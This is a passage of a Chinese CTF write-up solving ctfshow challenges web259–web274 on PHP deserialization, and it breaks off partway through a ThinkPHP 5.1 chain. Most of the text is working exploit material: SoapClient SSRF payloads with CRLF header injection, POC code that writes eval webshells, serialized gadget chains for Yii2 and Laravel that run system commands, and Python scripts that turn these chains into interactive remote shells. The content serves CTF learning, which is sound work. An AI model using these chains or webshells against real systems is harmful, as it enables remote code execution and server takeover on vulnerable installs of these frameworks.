> 种简单的基于 XML 的协议,它使应用程序通过 HTTP 来交换信息)，其次我们知道某个实例化的类，如果
>
> 去调用了一个不存在的函数，会去调用 __call 方法

调用不存在的方法，使`SoapClient`类去调用`__call`方法

```php
php
<?php
    $a = new SoapClient(null,array('uri'=>'aaa', 'location'=>'http://127.0.0.1:5555/path'));
    $b = serialize($a);
    echo $b;
    $c = unserialize($b);
    $c->dotast();
```

[![img](assets/0.png)](https://blog-file-1302856486.file.myqcloud.com/web1000(二)/web259/0.png)
 [![img](../../CTF_%25E7%25AC%2594%25E8%25AE%25B0%25E8%25AE%25B0%25E5%25BE%2597%25E8%25BD%25AC%25E7%25A7%25BB/web/CTFSHOW/ctfshow_web%2525E5%25258F%252582%2525E8%252580%252583/assets/2-17001059136662.png)](https://blog-file-1302856486.file.myqcloud.com/web1000(二)/web259/2.png)

**CRLF漏洞**

> CRLF是”回车 + 换行”（\r\n）的简称。在HTTP协议中，HTTP Header与HTTP  Body是用两个CRLF分隔的，浏览器就是根据这两个CRLF来取出HTTP 内容并显示出来。所以，一旦我们能够控制HTTP  消息头中的字符，注入一些恶意的换行，这样我们就能注入一些会话Cookie或者HTML代码，所以CRLF Injection又叫HTTP  Response Splitting，简称HRS

在上面的图中，我们可以看到，`SOAPAction`是可控的点，我们注入两个`\r\n`来控制POST请求头

```php
php
<?php
    $a = new SoapClient(null,array('uri'=>"aaa\r\n\r\nbbb\r\n", 'location'=>'http://127.0.0.1:5555/path'));
    $b = serialize($a);
    echo $b;
    $c = unserialize($b);
    $c->dotast();
```

执行后可以看到成功控制了请求头

[![img](assets/image-20210829165019106.png)](https://blog-file-1302856486.file.myqcloud.com/web1000(二)/web259/image-20210829165019106.png)
 [![img](../../CTF_%25E7%25AC%2594%25E8%25AE%25B0%25E8%25AE%25B0%25E5%25BE%2597%25E8%25BD%25AC%25E7%25A7%25BB/web/CTFSHOW/ctfshow_web%2525E5%25258F%252582%2525E8%252580%252583/assets/image-20210829165048219.png)](https://blog-file-1302856486.file.myqcloud.com/web1000(二)/web259/image-20210829165048219.png)但还有一个问题需要解决，POST数据指定请求头为`Content-Type:application/x-www-form-urlencoded`，我们需要控制`Content-Type`，但从上图中可以发现它位于`SOAPAtion`上方。
 继续往上，可以发现`User-Agent`位于`Content-Type`上方，这个位置也可以进行注入，所以我们再`User-Agent`进行注入

```php
php
<?php
	$post_string = "dotast=cool";
    $a = new SoapClient(null,array('location'=>'http://127.0.0.1:5555/path', 'user_agent'=>"dotast\r\nContent-Type:application/x-www-form-urlencoded\r\n"."Content-Length: ".(string)strlen($post_string)."\r\n\r\n".$post_string, 'uri'=>"aaa"));
    $b = serialize($a);
    echo $b;
    $c = unserialize($b);
    $c->dotast();
```

![image-20231116132456186](assets/image-20231116132456186.png)

![image-20231116132517129](assets/image-20231116132517129.png)

 如图，构造任意post请求成功！到此，一系列流程都弄懂后，我们回到题目本身
 **flag.php**

```php
php
$xff = explode(',', $_SERVER['HTTP_X_FORWARDED_FOR']);
array_pop($xff);
$ip = array_pop($xff);


if($ip!=='127.0.0.1'){
	die('error');
}else{
	$token = $_POST['token'];
	if($token=='ctfshow'){
		file_put_contents('flag.txt',$flag);
	}
}
```

**index.php**

```php
php
<?php
highlight_file(__FILE__);
$vip = unserialize($_GET['vip']);
//vip can get flag one key
$vip->getFlag();
```

相关参数都给足了，利用ssrf访问flag.php，然后构造post数据`token=ctfshow`还有xff请求头，paylaod如下

```php
php
<?php
	$post_string = "token=ctfshow";
    $a = new SoapClient(null,array('location'=>'http://127.0.0.1/flag.php', 'user_agent'=>"dotast\r\nContent-Type:application/x-www-form-urlencoded\r\n"."X-Forwarded-For: 127.0.0.1,127.0.0.1\r\n"."Content-Length: ".(string)strlen($post_string)."\r\n\r\n".$post_string, 'uri'=>"aaa"));
    $b = serialize($a);
    echo urlencode($b);
```

这里`X-Forwarded-For`里面需要两个`127.0.0.1`的原因是docker环境cloudfare代理所导致，具体可参考这篇文章：

```php
https://support.cloudflare.com/hc/zh-cn/articles/200170986-Cloudflare-%E5%A6%82%E4%BD%95%E5%A4%84%E7%90%86-HTTP-%E8%AF%B7%E6%B1%82%E6%A0%87%E5%A4%B4-
```

运行php生成payload(**需要开启soap扩展，在php.ini文件中，注销soap扩展dll的注释**)
![image-20231116132750486](assets/image-20231116132750486.png)

get参数`vip`传入

![image-20231116132809081](assets/image-20231116132809081.png)

再访问flag.txt就有了

![image-20231116132826476](assets/image-20231116132826476.png)

### web260

```
<?php

error_reporting(0);
highlight_file(__FILE__);
include('flag.php');

if(preg_match('/ctfshow_i_love_36D/',serialize($_GET['ctfshow']))){
    echo $flag;
}

```

是这样的，首先包含了flag.php，如果ctfshow的GET请求序列化后有“ctfshow_i_love_36D”字样就给你flag。

可序列化又不更改对象名称，所以直接输入即可，这题纯吓唬人。

payload:?ctfshow=ctfshow_i_love_36D

### web261（php>=7.4,______unserialize()函数与______wakeup()函数同时存在时，只有前者会起作用）

```php
<?php

highlight_file(__FILE__);

class ctfshowvip{
    public $username;
    public $password;
    public $code;

    public function __construct($u,$p){
        $this->username=$u;
        $this->password=$p;
    }
    public function __wakeup(){
        if($this->username!='' || $this->password!=''){
            die('error');
        }
    }
    public function __invoke(){
        eval($this->code);
    }

    public function __sleep(){
        $this->username='';
        $this->password='';
    }
    public function __unserialize($data){
        $this->username=$data['username'];
        $this->password=$data['password'];
        $this->code = $this->username.$this->password;
    }
    public function __destruct(){
        if($this->code==0x36d){
            file_put_contents($this->username, $this->password);
        }
    }
}

unserialize($_GET['vip']);
```

魔术方法的反序列化，一眼顶真。

看得出来我们应该执行__invoke()

**在php7.4.0开始，如果类中同时定义了 __unserialize() 和** __wakeup() 两个魔术方法，则只有 __unserialize() 方法会生效，__wakeup() 方法会被忽略。 我们不需要考虑__wakeup,__invoke是类被进行函数调用时启用，也无法利用到，所以直接看看能不能写入文件。

0x36d十进制就等于877,因为是弱类型比较，像877a等都可以通过，所以我们用username='877.php',password='一句话木马'，不用在意那个wakeup

```php
<?php
    class ctfshowvip
    {
        public $username;
        public $password;

        public function __construct($u, $p)
        {
            $this->username = $u;
            $this->password = $p;
        }
    }

    $a = new ctfshowvip('877.php', '<?=eval($_POST[1]);?>');
    echo urlencode(serialize($a));
?>
```

如此一来，当a被输入后，$code就会将username和password拼接起来再传给__destruct()中然后让它输出。这样我们就把木马成功写入877.php文件，之后用AntSword连接即可。

得到的序列化值为：

O%3A10%3A%22ctfshowvip%22%3A2%3A%7Bs%3A8%3A%22username%22%3Bs%3A7%3A%22877.php%22%3Bs%3A8%3A%22password%22%3Bs%3A21%3A%22%3C%3F%3Deval%28%24_POST%5B1%5D%29%3B%3F%3E%22%3B%7D

用vip作为GET输入后，挂上木马，不过没有回显，无所谓了。访问877.php即可得到webshell，然后拿到flag。

flag在/flag_is_here中，害得我一顿好找。

![](assets/web261.png)

### web262（反序列化字符串逃逸---字符增多）

```php
//index.php
<?php

/*
# -*- coding: utf-8 -*-
# @Author: h1xa
# @Date:   2020-12-03 02:37:19
# @Last Modified by:   h1xa
# @Last Modified time: 2020-12-03 16:05:38
# @message.php
# @email: h1xa@ctfer.com
# @link: https://ctfer.com

*/

error_reporting(0);
class message{
    public $from;
    public $msg;
    public $to;
    public $token='user';
    public function __construct($f,$m,$t){
        $this->from = $f;
        $this->msg = $m;
        $this->to = $t;
    }
}

$f = $_GET['f'];
$m = $_GET['m'];
$t = $_GET['t'];

if(isset($f) && isset($m) && isset($t)){
    $msg = new message($f,$m,$t);
    $umsg = str_replace('fuck', 'loveU', serialize($msg));
    setcookie('msg',base64_encode($umsg));
    echo 'Your message has been sent';
}

highlight_file(__FILE__);


```

**注释里告诉我们message.php,要求我们的token为admin**

```php
//message.php
<?php
highlight_file(__FILE__);
include('flag.php');
class message{
    public $from;
    public $msg;
    public $to;
    public $token='user';
    public function __construct($f,$m,$t){
        $this->from = $f;
        $this->msg = $m;
        $this->to = $t;
    }
}
if(isset($_COOKIE['msg'])){
    $msg = unserialize(base64_decode($_COOKIE['msg']));
    if($msg->token=='admin'){
        echo $flag;
    }
}
```

梳理一下代码逻辑，index.php中，传入f,m,t三个参数，代码根据三个参数进行实例化message类，并在序列化后将其中的fuck替换成loveU,字符增多一位，之后将处理后的序列化数据放到cookie变量中，供message.php使用。

而在message.php文件中，从cookie变量中取出刚才传入的序列化数据，只要`message`类中的`token`的值为`admin`，就会输出flag，所以我们的payload需要如下形式

```php
";s:5:"token";s:5:"admin";}
//token是最后一个成员变量，所以位置在最后边
//开头的";用来闭合前面的序列化字符串
```

构造的payload长度一共27位，所以我们需要输入27个`fuck`来获得额外的27个长度，来匹配原本传入参数中的payload长度，之后我们的恶意数据就逃溢出来了，以达到填充我们的字符的目的，最后payload如下

```php
?f=123&m=123&t=fuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuck";s:5:"token";s:5:"admin";}
```

然后再访问`message.php`就可以输入flag

### web263(代码审计，session反序列化（可控制$_SESSION的）)

按下F12后发现Script脚本

```php
		function check(){
			$.ajax({
			url:'check.php',
			type: 'GET',
			data:{
				'u':$('#u').val(),
				'pass':$('#pass').val()
			},
			success:function(data){
				alert(JSON.parse(data).msg);
			},
			error:function(data){
				alert(JSON.parse(data).msg);
			}

		});
		}	
```

本题考查session反序列化漏洞，扫描目录可得www.zip，下载得到源代码

```php
<?php

	error_reporting(0);
	session_start();
	//超过5次禁止登陆
	if(isset($_SESSION['limit'])){
		$_SESSION['limti']>5?die("登陆失败次数超过限制"):$_SESSION['limit']=base64_decode($_COOKIE['limit']);
		$_COOKIE['limit'] = base64_encode(base64_decode($_COOKIE['limit']) +1);
	}else{
		 setcookie("limit",base64_encode('1'));
		 $_SESSION['limit']= 1;
	}
	
?>

```

代码审计后主要有几个关键区域。

在index.php 我们发现$_SESSION['limit']我们可以进行控制

```php
//超过5次禁止登陆
if(isset($_SESSION['limit'])){
  $_SESSION['limti']>5?die("登陆失败次数超过限制"):$_SESSION['limit']=base64_decode($_COOKIE['limit']);
  $_COOKIE['limit'] = base64_encode(base64_decode($_COOKIE['limit']) +1);
}else{
   setcookie("limit",base64_encode('1'));
   $_SESSION['limit']= 1;
}
```

flag在flag.php处，目测需要rce

```php
$flag="flag_here";
```

inc.php 设置了session的序列化引擎为php，很有可能说明默认使用的是php_serialize

```php
ini_set('session.serialize_handler', 'php');
```

并且inc.php中有一个User类的__destruct含有file_put_contents函数，并且username和password可控，可以进行写文件geshell

```php
   function __destruct(){
        file_put_contents("log-".$this->username, "使用".$this->password."登陆".($this->status?"成功":"失败")."----".date_create()->format('Y-m-d H:i:s'));
    }
```

开始构造EXP，生成payload

```php
<?php
class User{
    public $username = 'dotast.php';
    public $password = '<?php system("tac flag.php");?>';
    public $status='dotast';

}
$a=new User();
echo base64_encode('|'.serialize($a)); //session反序列化，加竖线破坏反序列化格式

```

payload:

```php
fE86NDoiVXNlciI6Mzp7czo4OiJ1c2VybmFtZSI7czoxMDoiZG90YXN0LnBocCI7czo4OiJwYXNzd29yZCI7czozMToiPD9waHAgc3lzdGVtKCJ0YWMgZmxhZy5waHAiKTs/PiI7czo2OiJzdGF0dXMiO3M6NjoiZG90YXN0Ijt9
```

然后存进cookie中，带着cookie去访问index.php，将恶意数据写入$SESSION中，接着访问inc/inc.php，自动触发$SESSION的反序列化，执行payload,然后就会生成文件log-dotast.php，即可得到flag。直接写一个脚本

```php
import requests
url = "http://07dfca9c-be01-400d-a0a3-643f0670a574.challenge.ctf.show/"
cookies = {"PHPSESSID": "d4flve2gtoi1ep93ajdh202l05", "limit": "fE86NDoiVXNlciI6Mzp7czo4OiJ1c2VybmFtZSI7czoxMDoiZG90YXN0LnBocCI7czo4OiJwYXNzd29yZCI7czozMToiPD9waHAgc3lzdGVtKCJ0YWMgZmxhZy5waHAiKTs/PiI7czo2OiJzdGF0dXMiO3M6NjoiZG90YXN0Ijt9"}
res1 = requests.get(url + "index.php", cookies=cookies)

res2 = requests.get(url + "inc/inc.php", cookies=cookies)

res3 = requests.get(url + "log-dotast.php", cookies=cookies)
print(res3.text)
```

![](assets/web263.png)

![](assets/web263-%E8%9A%81%E5%89%91.png)



### web264

```php
<?php

/*
# -*- coding: utf-8 -*-
# @Author: h1xa
# @Date:   2020-12-03 02:37:19
# @Last Modified by:   h1xa
# @Last Modified time: 2020-12-03 16:05:38
# @message.php
# @email: h1xa@ctfer.com
# @link: https://ctfer.com

*/


error_reporting(0);
session_start();

class message{
    public $from;
    public $msg;
    public $to;
    public $token='user';
    public function __construct($f,$m,$t){
        $this->from = $f;
        $this->msg = $m;
        $this->to = $t;
    }
}

$f = $_GET['f'];
$m = $_GET['m'];
$t = $_GET['t'];

if(isset($f) && isset($m) && isset($t)){
    $msg = new message($f,$m,$t);
    $umsg = str_replace('fuck', 'loveU', serialize($msg));
    $_SESSION['msg']=base64_encode($umsg);
    echo 'Your message has been sent';
}

highlight_file(__FILE__);

```

源码中显示输入f,m,t三个GET请求后，将fuck替换为loveU，将t替换为msg的序列化结果。然后msg应当和umsg的base64编码相同。

当

```
?f=a&m=b&t=fuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuck";s:5:"token";s:4:"admin";}
```

时，字符串数量正确

注意message.php处需要自行输入名为msg的Cookie

![](assets/web264.png)

### web265（利用引用，绑定变量，使值永远相等）

举例：

```php
<?php
class test{
    public $a;
    public $b;
    public function __construct(){
        $this->a = 'abc';
        $this->b= &$this->a;//绑定a和b变量，改变一个的值就改变另一个
    }
    public function  __destruct(){

        if($this->a===$this->b){
            echo 666;
        }
    }
}
$a = serialize(new test());
```



```php
<?php
error_reporting(0);
include('flag.php');
highlight_file(__FILE__);
class ctfshowAdmin{
    public $token;
    public $password;

    public function __construct($t,$p){
        $this->token=$t;
        $this->password = $p;
    }
    public function login(){
        return $this->token===$this->password;
    }
}

$ctfshow = unserialize($_GET['ctfshow']);
$ctfshow->token=md5(mt_rand());

if($ctfshow->login()){
    echo $flag;
}
```

对ctfshow的GET请求反序列化，若login存在输出flag。

login()则是检查token和password是否相等，很明显源代码中ctfshow的token为随机值。

考察php按地址传参，直接将二者绑定。

poc:

```php
<?php
class ctfshowAdmin{
    public $token = "anything1";
    public $password = "anything2";
}

$a = new ctfshowAdmin();
//$a ->token=&$a ->password;
$a ->password=&$a ->token;
echo urlencode(serialize($a));
```

payload:

```php
?ctfshow=O%3A12%3A%22ctfshowAdmin%22%3A2%3A%7Bs%3A5%3A%22token%22%3Bs%3A9%3A%22anything1%22%3Bs%3A8%3A%22password%22%3BR%3A2%3B%7D
```

![](assets/web265.png)



### web266（反序列化时，类名对大小写不敏感，如果是属性名过滤，可以采用修改属性描述符为大写，之后对过滤字符使用16进制编码）

```php
<?php

highlight_file(__FILE__);

include('flag.php');
$cs = file_get_contents('php://input');


class ctfshow{
    public $username='xxxxxx';
    public $password='xxxxxx';
    public function __construct($u,$p){
        $this->username=$u;
        $this->password=$p;
    }
    public function login(){
        return $this->username===$this->password;
    }
    public function __toString(){
        return $this->username;
    }
    public function __destruct(){
        global $flag;
        echo $flag;
    }
}
$ctfshowo=@unserialize($cs);
if(preg_match('/ctfshow/', $cs)){
    throw new Exception("Error $ctfshowo",1);
}
```

POST传参

```
<?php
class ctfshow{
    public $username='xxxxxx';
    public $password='xxxxxx';
}
echo serialize(new ctfshow())
?>
```

反序列化结果大小写不敏感，ctfshow改为cTFsHow即可。

payload:

```php
O:7:"cTFsHow":2:{s:8:"username";s:6:"xxxxxx";s:8:"password";s:6:"xxxxxx";}
在burp发包，不要url编码
```

![](assets/web266.png)

### web267（Yii2反序列化漏洞）

login处，admin&admin弱口令登录

发现<!--?view-source -->，?r=site%2Fabout&view-source查看

///backdoor/shell
unserialize(base64_decode($_GET['code']))

POC

```php
<?php
namespace Faker{
    class DefaultGenerator{
        protected $default;
        public function __construct()
        {
            $this->default = "ls";
        }
    }

    class ValidGenerator
    {
        protected $generator;
        protected $validator;
        protected $maxRetries;
        public function __construct()
        {
            $this -> generator = new DefaultGenerator();
            $this -> validator = "shell_exec";//这里用system没回显，估计被ban了
            $this -> maxRetries = 1;
        }
    }
}

namespace Codeception\Extension {
    use Faker\ValidGenerator;
    class RunProcess{
        private $processes;
        public function __construct()
        {
            $this -> processes = [new ValidGenerator()];
        }
    }
}
namespace app\controllers {
    use Codeception\Extension\RunProcess;
    $a = new RunProcess();
    $res = serialize($a);
    echo  base64_encode($res);
}
```



payload:

```php
?r=/backdoor/shell&code=TzoyMzoieWlpXGRiXEJhdGNoUXVlcnlSZXN1bHQiOjE6e3M6MzY6IgB5aWlcZGJcQmF0Y2hRdWVyeVJlc3VsdABfZGF0YVJlYWRlciI7TzoxNToiRmFrZXJcR2VuZXJhdG9yIjoxOntzOjEzOiIAKgBmb3JtYXR0ZXJzIjthOjE6e3M6NToiY2xvc2UiO2E6Mjp7aTowO086MjE6InlpaVxyZXN0XENyZWF0ZUFjdGlvbiI6Mjp7czoxMToiY2hlY2tBY2Nlc3MiO3M6ODoicGFzc3RocnUiO3M6MjoiaWQiO3M6OToidGFjIC9mbGFnIjt9aToxO3M6MzoicnVuIjt9fX19
```

![image-20231116164051667](assets/image-20231116164051667.png)

#### 脚本利用

```python
import requests, base64, time


def round(command: str, arg: str):
    url = "http://b491d895-d559-480c-9452-755528e4a4d7.challenge.ctf.show/"  # 以/结尾
    payload = b'O:32:"Codeception\\Extension\\RunProcess":1:{s:43:"\x00Codeception\\Extension\\RunProcess\x00processes";a:1:{i:0;O:20:"Faker\\ValidGenerator":3:{s:12:"\x00*\x00generator";O:22:"Faker\\DefaultGenerator":1:{s:10:"\x00*\x00default";s:arg_l:"arg";}s:12:"\x00*\x00validator";s:function_l:"function";s:13:"\x00*\x00maxRetries";i:1;}}}'
    payload = payload.replace(b"function_l", str(len(command)).encode())
    payload = payload.replace(b"function", command.encode())
    
    payload = payload.replace(b"arg_l", str(len(arg)).encode())
    payload = payload.replace(b"arg", arg.encode())
    params = {"r": "/backdoor/shell", "code": base64.b64encode(payload).decode()}
    while True:
        try:
            resp = requests.get(url+"index.php", params=params)
            break
        except:
            time.sleep(0.1)
    
    while True:
        try:
            resp = requests.get(url+"1")
            break
        except:
            time.sleep(0.1)
    
    return resp.text


if __name__ == '__main__':
    print("请输入命令...")
    while True:
        command = "shell_exec"
        arg = input(">>> ")
        if arg == "exit":
            break
        if arg == "":
            continue
        res = round(command, arg + " | tee 1")
        print(res[:-1])
```

### web268-270（yii反序列化第二个链子）

同样的漏洞，但是需要换一个链子：

```php
<?php

namespace yii\rest {
    class Action
    {
        public $checkAccess;
    }
    class IndexAction
    {
        public function __construct($func, $param)
        {
            $this->checkAccess = $func;
            $this->id = $param;
        }
    }
}
namespace yii\web {
    abstract class MultiFieldSession
    {
        public $writeCallback;
    }
    class DbSession extends MultiFieldSession
    {
        public function __construct($func, $param)
        {
            $this->writeCallback = [new \yii\rest\IndexAction($func, $param), "run"];
        }
    }
}
namespace yii\db {
    use yii\base\BaseObject;
    class BatchQueryResult
    {
        private $_dataReader;
        public function __construct($func, $param)
        {
            $this->_dataReader = new \yii\web\DbSession($func, $param);
        }
    }
}
namespace {
    $exp = new \yii\db\BatchQueryResult('shell_exec', 'echo "<?php eval(\$_POST[1]);phpinfo();?>" >/var/www/html/basic/web/1.php');
    echo(base64_encode(serialize($exp)));
}
?>
    
    
    
?r=/backdoor/shell&code=TzoyMzoieWlpXGRiXEJhdGNoUXVlcnlSZXN1bHQiOjE6e3M6MzY6IgB5aWlcZGJcQmF0Y2hRdWVyeVJlc3VsdABfZGF0YVJlYWRlciI7TzoxNzoieWlpXHdlYlxEYlNlc3Npb24iOjE6e3M6MTM6IndyaXRlQ2FsbGJhY2siO2E6Mjp7aTowO086MjA6InlpaVxyZXN0XEluZGV4QWN0aW9uIjoyOntzOjExOiJjaGVja0FjY2VzcyI7czoxMDoic2hlbGxfZXhlYyI7czoyOiJpZCI7czo3MzoiZWNobyAiPD9waHAgZXZhbChcJF9QT1NUWzFdKTtwaHBpbmZvKCk7Pz4iID4vdmFyL3d3dy9odG1sL2Jhc2ljL3dlYi8xLnBocCI7fWk6MTtzOjM6InJ1biI7fX19

```

访问1.php可以直接看到phpinfo()，说明木马已经成功植入。

![image-20231116165411099](assets/image-20231116165411099.png)

蚁剑连接即可。

![](assets/web268.png)

![](assets/web269.png)

![](assets/web270.png)

你们仨一个个咋的？

再来俩poc

```php
poc_more_1

<?php
namespace yii\rest{
    class CreateAction{
        public $checkAccess;
        public $id;

        public function __construct(){
            $this->checkAccess = 'system';
            $this->id = 'dir';
        }
    }
}

namespace Faker{
    use yii\rest\CreateAction;

    class Generator{
        protected $formatters;

        public function __construct(){
            // 这里需要改为isRunning
            $this->formatters['render'] = [new CreateAction(), 'run'];
        }
    }
}

namespace phpDocumentor\Reflection\DocBlock\Tags{

    use Faker\Generator;

    class See{
        protected $description;
        public function __construct()
        {
            $this->description = new Generator();
        }
    }
}
namespace{
    use phpDocumentor\Reflection\DocBlock\Tags\See;
    class Swift_KeyCache_DiskKeyCache{
        private $keys = [];
        private $path;
        public function __construct()
        {
            $this->path = new See;
            $this->keys = array(
                "axin"=>array("is"=>"handsome")
            );
        }
    }
    // 生成poc
    echo base64_encode(serialize(new Swift_KeyCache_DiskKeyCache()));
}
?>
    
    
    
    
    
poc_more_2
    
<?php
namespace yii\rest {
    class Action
    {
        public $checkAccess;
    }
    class IndexAction
    {
        public function __construct($func, $param)
        {
            $this->checkAccess = $func;
            $this->id = $param;
        }
    }
}
namespace yii\web {
    abstract class MultiFieldSession
    {
        public $writeCallback;
    }
    class DbSession extends MultiFieldSession
    {
        public function __construct($func, $param)
        {
            $this->writeCallback = [new \yii\rest\IndexAction($func, $param), "run"];
        }
    }
}
namespace yii\db {
    use yii\base\BaseObject;
    class BatchQueryResult
    {
        private $_dataReader;
        public function __construct($func, $param)
        {
            $this->_dataReader = new \yii\web\DbSession($func, $param);
        }
    }
}
namespace {
    $exp = new \yii\db\BatchQueryResult('system', 'whoami');
    echo(base64_encode(serialize($exp)));
}
```



### web271(Laravel反序列化漏洞)

```php
<?php

/**
 * Laravel - A PHP Framework For Web Artisans
 *
 * @package  Laravel
 * @author   Taylor Otwell <taylor@laravel.com>
 */

define('LARAVEL_START', microtime(true));

/*
|--------------------------------------------------------------------------
| Register The Auto Loader
|--------------------------------------------------------------------------
|
| Composer provides a convenient, automatically generated class loader for
| our application. We just need to utilize it! We'll simply require it
| into the script here so that we don't have to worry about manual
| loading any of our classes later on. It feels great to relax.
|
*/

require __DIR__ . '/../vendor/autoload.php';

/*
|--------------------------------------------------------------------------
| Turn On The Lights
|--------------------------------------------------------------------------
|
| We need to illuminate PHP development, so let us turn on the lights.
| This bootstraps the framework and gets it ready for use, then it
| will load up this application so that we can run it and send
| the responses back to the browser and delight our users.
|
*/

$app = require_once __DIR__ . '/../bootstrap/app.php';

/*
|--------------------------------------------------------------------------
| Run The Application
|--------------------------------------------------------------------------
|
| Once we have the application, we can handle the incoming request
| through the kernel, and send the associated response back to
| the client's browser allowing them to enjoy the creative
| and wonderful application we have prepared for them.
|
*/

$kernel = $app->make(Illuminate\Contracts\Http\Kernel::class);
$response = $kernel->handle(  $request = Illuminate\Http\Request::capture());
@unserialize($_POST['data']);
highlight_file(__FILE__);
$kernel->terminate($request, $response);
```

exp:

```php
<?php
namespace Illuminate\Foundation\Testing{
    class PendingCommand{
        protected $command;
        protected $parameters;
        protected $app;
        public $test;
        public function __construct($command, $parameters,$class,$app){
            $this->command = $command;
            $this->parameters = $parameters;
            $this->test=$class;
            $this->app=$app;
        }
    }
}
namespace Illuminate\Auth{
    class GenericUser{
        protected $attributes;
        public function __construct(array $attributes){
            $this->attributes = $attributes;
        }
    }
}
namespace Illuminate\Foundation{
    class Application{
        protected $hasBeenBootstrapped = false;
        protected $bindings;
        public function __construct($bind){
            $this->bindings=$bind;
        }
    }
}
namespace{
    $genericuser = new Illuminate\Auth\GenericUser(
        array(
            "expectedOutput"=>array("0"=>"1"),
            "expectedQuestions"=>array("0"=>"1")
        )
    );
    $application = new Illuminate\Foundation\Application(
        array(
            "Illuminate\Contracts\Console\Kernel"=>
                array(
                    "concrete"=>"Illuminate\Foundation\Application"
                )
        )
    );
    $pendingcommand = new Illuminate\Foundation\Testing\PendingCommand(
        "system",array('tac /f*'),
        $genericuser,
        $application
    );
    echo urlencode(serialize($pendingcommand));
}
#post记得直接复制到burp中去发送，其中私有属性序列化后有*等特殊字符，用hackbar等会有编码问题，导致不成功
data=O%3A44%3A%22Illuminate%5CFoundation%5CTesting%5CPendingCommand%22%3A4%3A%7Bs%3A10%3A%22%00%2A%00command%22%3Bs%3A6%3A%22system%22%3Bs%3A13%3A%22%00%2A%00parameters%22%3Ba%3A1%3A%7Bi%3A0%3Bs%3A7%3A%22tac+%2Ff%2A%22%3B%7Ds%3A6%3A%22%00%2A%00app%22%3BO%3A33%3A%22Illuminate%5CFoundation%5CApplication%22%3A2%3A%7Bs%3A22%3A%22%00%2A%00hasBeenBootstrapped%22%3Bb%3A0%3Bs%3A11%3A%22%00%2A%00bindings%22%3Ba%3A1%3A%7Bs%3A35%3A%22Illuminate%5CContracts%5CConsole%5CKernel%22%3Ba%3A1%3A%7Bs%3A8%3A%22concrete%22%3Bs%3A33%3A%22Illuminate%5CFoundation%5CApplication%22%3B%7D%7D%7Ds%3A4%3A%22test%22%3BO%3A27%3A%22Illuminate%5CAuth%5CGenericUser%22%3A1%3A%7Bs%3A13%3A%22%00%2A%00attributes%22%3Ba%3A2%3A%7Bs%3A14%3A%22expectedOutput%22%3Ba%3A1%3A%7Bi%3A0%3Bs%3A1%3A%221%22%3B%7Ds%3A17%3A%22expectedQuestions%22%3Ba%3A1%3A%7Bi%3A0%3Bs%3A1%3A%221%22%3B%7D%7D%7D%7D


```

![image-20231116170839162](assets/image-20231116170839162.png)

### web272-273（Laravel其他链子）

还有高手？

```php
<?php
namespace Illuminate\Broadcasting{

    use Illuminate\Bus\Dispatcher;
    use Illuminate\Foundation\Console\QueuedCommand;

    class PendingBroadcast
    {
        protected $events;
        protected $event;
        public function __construct(){
            $this->events=new Dispatcher();
            $this->event=new QueuedCommand();
        }
    }
}
namespace Illuminate\Foundation\Console{
    class QueuedCommand
    {
        public $connection="cat /flag";
    }
}
namespace Illuminate\Bus{
    class Dispatcher
    {
        protected $queueResolver="system";

    }
}
namespace{

    use Illuminate\Broadcasting\PendingBroadcast;

    echo urlencode(serialize(new PendingBroadcast()));
}

#
data=O%3A40%3A%22Illuminate%5CBroadcasting%5CPendingBroadcast%22%3A2%3A%7Bs%3A9%3A%22%00%2A%00events%22%3BO%3A25%3A%22Illuminate%5CBus%5CDispatcher%22%3A1%3A%7Bs%3A16%3A%22%00%2A%00queueResolver%22%3Bs%3A6%3A%22system%22%3B%7Ds%3A8%3A%22%00%2A%00event%22%3BO%3A43%3A%22Illuminate%5CFoundation%5CConsole%5CQueuedCommand%22%3A1%3A%7Bs%3A10%3A%22connection%22%3Bs%3A9%3A%22cat+%2Fflag%22%3B%7D%7D


```

![](assets/web272.png)

![](assets/web273.png)

利用脚本

```python
脚本
直接当成虚拟终端用
import requests, base64, time


def round(command: str, arg: str):
    url = "http://8cd12f44-e068-4ebf-9c52-31d16fb6e18b.challenge.ctf.show/"  # 末尾的/不能少了
    payload = b'O:40:"Illuminate\\Broadcasting\\PendingBroadcast":2:{s:9:"\x00*\x00events";O:15:"Faker\\Generator":1:{s:13:"\x00*\x00formatters";a:1:{s:8:"dispatch";s:function_l:"function";}}s:8:"\x00*\x00event";s:arg_l:"arg";}'
    payload = payload.replace(b"function_l", str(len(command)).encode())
    payload = payload.replace(b"function", command.encode())
    
    payload = payload.replace(b"arg_l", str(len(arg)).encode())
    payload = payload.replace(b"arg", arg.encode())
    params = {"r": "test/ss", "data": payload}
    while True:
        try:
            resp = requests.post(url, data=params)
            break
        except:
            time.sleep(0.1)
    
    while True:
        try:
            resp = requests.get(url+"1")
            break
        except:
            time.sleep(0.1)
    
    return resp.text


if __name__ == '__main__':
    print("请输入命令...")
    while True:
        command = "system"
        arg = input(">>> ")
        if arg == "exit":
            break
        if arg == "":
            continue
        res = round(command, arg + " | tee 1")
        print(res[:-1])
```

![image-20231116171342515](assets/image-20231116171342515.png)

### web274（thinkphp5.1.*rce反序列化漏洞）

反序列化链是从 `__destruct()` 开始

<!-- @unserialize(base64_decode(\$_GET['data']))-->

exp:

```php
<?php
namespace think\process\pipes{

    use think\model\Pivot;

    class Windows
    {
        private $files = [];
        public function __construct(){
            $this->files[]=new Pivot();
        }
    }
}
namespace think{
    abstract class Model
    {
        protected $append = [];
        private $data = [];
        public function __construct(){
            $this->data=array(
              'feng'=>new Request()
            );
            $this->append=array(
                'feng'=>array(
                    'hello'=>'world'
                )
            );
        }
    }
}
namespace think\model{

    use think\Model;

    class Pivot extends Model
    {

    }
}
namespace think{
    class Request
    {
        protected $hook = [];
        protected $filter;
        protected $config = [
            // 表单请求类型伪装变量
            'var_method'       => '_method',
            // 表单ajax伪装变量
            'var_ajax'         => '',
            // 表单pjax伪装变量
            'var_pjax'         => '_pjax',
            // PATHINFO变量名 用于兼容模式
            'var_pathinfo'     => 's',
            // 兼容PATH_INFO获取
            'pathinfo_fetch'   => ['ORIG_PATH_INFO', 'REDIRECT_PATH_INFO', 'REDIRECT_URL'],
            // 默认全局过滤方法 用逗号分隔多个
            'default_filter'   => '',
            // 域名根，如thinkphp.cn
            'url_domain_root'  => '',
            // HTTPS代理标识
            'https_agent_name' => '',
